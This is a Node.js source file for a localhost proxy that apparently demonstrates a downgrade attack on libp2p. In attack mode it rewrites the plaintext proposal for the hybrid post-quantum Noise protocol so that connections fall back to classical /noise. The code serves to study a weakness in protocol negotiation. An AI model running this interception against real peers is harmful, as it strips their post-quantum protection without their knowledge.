// On-path TCP proxy for the libp2p security-protocol downgrade demonstration.
//
// It sits between a dialer and a listener on 127.0.0.1 and inspects the
// PLAINTEXT multistream-select exchange that libp2p uses to choose a
// connection encrypter. In "tap" mode it relays every byte unmodified and
// only records the frames it sees, so a baseline connection can be observed
// on the wire without being altered. In "attack" mode it additionally rewrites
// the hybrid post-quantum protocol proposal so the real listener no longer
// recognises it and answers "na" itself; the dialer then falls back to
// classical /noise. The proxy never forges a response and never touches the
// encrypted Noise/muxer/application bytes that follow negotiation.
//
// multistream-select wire format: a sequence of unsigned-varint length-prefixed
// UTF-8 strings, each terminated by '\n'. See @libp2p/multistream-select.

import net from 'node:net'

export const HYBRID_ID = '/noise-mlkem768-hfs/0.2.0'
export const CLASSICAL_ID = '/noise'
// Same byte length as HYBRID_ID (25 chars) so the varint length prefix is
// unchanged; the listener has no handler for it and replies "na".
const HYBRID_REWRITE = '/noise-mlkem768-xxx/0.2.0'
const MS_HEADER = '/multistream/1.0.0'
const MAX_PROTOCOL_LENGTH = 1024
const MAX_INSPECT_FRAMES = 16
const KNOWN_SECURITY_IDS = new Set([HYBRID_ID, CLASSICAL_ID])

function readUvarint (buf, offset) {
  let value = 0
  let shift = 0
  let i = offset
  while (i < buf.length) {
    const b = buf[i++]
    value += (b & 0x7f) * Math.pow(2, shift)
    if ((b & 0x80) === 0) {
      return { value, bytesRead: i - offset }
    }
    shift += 7
    if (shift > 35) return { error: true }
  }
  return null // incomplete
}

const NEWLINE = 0x0a

// Create a per-direction stateful handler that parses multistream frames,
// records them, optionally rewrites the hybrid proposal, and relays bytes to
// the destination socket.
function makeDirectionHandler ({ label, dest, attack, transcript }) {
  let buffer = Buffer.alloc(0)
  let mode = 'inspect' // 'inspect' -> 'relay'
  let framesSeen = 0

  function flushRelay () {
    if (buffer.length > 0) {
      dest.write(buffer)
      buffer = Buffer.alloc(0)
    }
    mode = 'relay'
  }

  return function onData (chunk) {
    if (mode === 'relay') {
      dest.write(chunk)
      return
    }
    buffer = Buffer.concat([buffer, chunk])

    while (mode === 'inspect') {
      if (buffer.length === 0) break
      const vi = readUvarint(buffer, 0)
      if (vi == null) break // need more bytes for the length prefix
      if (vi.error || vi.value === 0 || vi.value > MAX_PROTOCOL_LENGTH) {
        // Not a multistream frame (e.g. Noise binary has begun). Relay the rest.
        transcript.push({ dir: label, action: 'relay-start', note: 'non-multistream bytes; switching to raw relay' })
        flushRelay()
        break
      }
      const frameLen = vi.bytesRead + vi.value
      if (buffer.length < frameLen) break // wait for the full frame
      const payload = buffer.subarray(vi.bytesRead, frameLen)
      if (payload[payload.length - 1] !== NEWLINE) {
        transcript.push({ dir: label, action: 'relay-start', note: 'framed bytes without trailing newline; switching to raw relay' })
        flushRelay()
        break
      }
      const decoded = payload.toString('utf8').replace(/\n$/, '')
      framesSeen++

      // Decide whether to rewrite this frame.
      if (attack && decoded === HYBRID_ID) {
        const rewritten = Buffer.concat([
          buffer.subarray(0, vi.bytesRead),
          Buffer.from(`${HYBRID_REWRITE}\n`, 'utf8')
        ])
        dest.write(rewritten)
        transcript.push({
          dir: label,
          action: 'rewrite',
          from: decoded,
          to: HYBRID_REWRITE,
          note: 'stripped the hybrid proposal: rewrote it to an unknown protocol id of identical length so the listener answers "na"'
        })
      } else {
        dest.write(buffer.subarray(0, frameLen))
        transcript.push({ dir: label, action: 'forward', protocol: decoded })
      }

      buffer = buffer.subarray(frameLen)

      // Stop inspecting once a real security protocol has been selected on the
      // wire, or after a safety cap, so we never parse the encrypted stream.
      if (KNOWN_SECURITY_IDS.has(decoded) || framesSeen >= MAX_INSPECT_FRAMES) {
        transcript.push({ dir: label, action: 'relay-start', note: `negotiation settled (last frame "${decoded}"); switching to raw relay` })
        flushRelay()
      }
    }
  }
}

// Start the proxy. Returns { port, transcript, close() }.
//
// Differences from the JS-only demo's proxy (logic otherwise copied verbatim):
//   - listenPort lets the caller pin the proxy to a known port.
//   - each TCP connection records which side closed first and how many bytes
//     crossed in each direction, so a refused handshake can be attributed to
//     the side that hung up.
export function startProxy ({ targetPort, targetHost = '127.0.0.1', attack = false, listenPort = 0 } = {}) {
  const transcript = []
  const sockets = new Set()
  let connIndex = 0

  const server = net.createServer((dialerSock) => {
    const conn = connIndex++
    sockets.add(dialerSock)
    const targetSock = net.connect(targetPort, targetHost)
    sockets.add(targetSock)
    const bytes = { 'dialer->listener': 0, 'listener->dialer': 0 }
    transcript.push({ dir: 'proxy', action: 'conn-open', conn })

    const d2l = makeDirectionHandler({ label: 'dialer->listener', dest: targetSock, attack, transcript })
    const l2d = makeDirectionHandler({ label: 'listener->dialer', dest: dialerSock, attack: false, transcript })

    dialerSock.on('data', (c) => { bytes['dialer->listener'] += c.length; try { d2l(c) } catch (e) { transcript.push({ dir: 'dialer->listener', action: 'error', note: String(e) }) } })
    targetSock.on('data', (c) => { bytes['listener->dialer'] += c.length; try { l2d(c) } catch (e) { transcript.push({ dir: 'listener->dialer', action: 'error', note: String(e) }) } })

    const teardown = () => {
      try { dialerSock.destroy() } catch {}
      try { targetSock.destroy() } catch {}
    }
    dialerSock.on('error', (e) => { transcript.push({ dir: 'proxy', action: 'socket-error', conn, side: 'dialer', note: String(e) }); teardown() })
    targetSock.on('error', (e) => { transcript.push({ dir: 'proxy', action: 'socket-error', conn, side: 'listener', note: String(e) }); teardown() })
    // 'end' = that peer sent FIN, i.e. it hung up. The first one names the
    // side that walked away from the connection.
    dialerSock.on('end', () => { transcript.push({ dir: 'proxy', action: 'fin', conn, from: 'dialer', bytes: { ...bytes } }) })
    targetSock.on('end', () => { transcript.push({ dir: 'proxy', action: 'fin', conn, from: 'listener', bytes: { ...bytes } }) })
    dialerSock.on('close', () => {
      transcript.push({ dir: 'proxy', action: 'close', conn, side: 'dialer', bytes: { ...bytes } })
      try { targetSock.end() } catch {}
    })
    targetSock.on('close', () => {
      transcript.push({ dir: 'proxy', action: 'close', conn, side: 'listener', bytes: { ...bytes } })
      try { dialerSock.end() } catch {}
    })
  })

  return new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(listenPort, '127.0.0.1', () => {
      const port = server.address().port
      resolve({
        port,
        transcript,
        mode: attack ? 'attack' : 'tap',
        close: () => new Promise((res) => {
          for (const s of sockets) { try { s.destroy() } catch {} }
          server.close(() => res())
        })
      })
    })
  })
}
